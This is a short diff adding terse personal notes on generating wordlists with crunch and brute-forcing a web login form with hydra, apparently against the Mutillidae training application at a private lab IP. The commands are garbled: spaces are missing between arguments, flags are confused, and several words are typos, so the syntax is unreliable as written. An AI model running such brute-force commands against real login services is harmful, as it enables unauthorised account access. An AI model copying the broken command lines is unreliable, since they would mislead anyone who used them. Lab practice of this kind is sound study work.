@@ -1,0 +1,21 @@
+crunch[min][max][characters]-+[pattern]-o[filename]
+
+eg crunch 68123abc$-i wordlist-ta@@@@b
+
+#in terminal
+man crunch
+crunch 68 abc12 -o test.txt
+cat test.txt
+ctrl+cat
+
+or
+crunch 66 abc12 -o test.txt -t a@@@@b cat test.txt
+
+#using hydra
+hydra[ip]-L[usernames] -p [passwords][service]
+
+e.g
+hydra 10.20.14.12-l admin -p/root/wordlist.txt http-post-form"mutilidae/?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=login:F=Not logged in"
+
+hydra --help
+zap
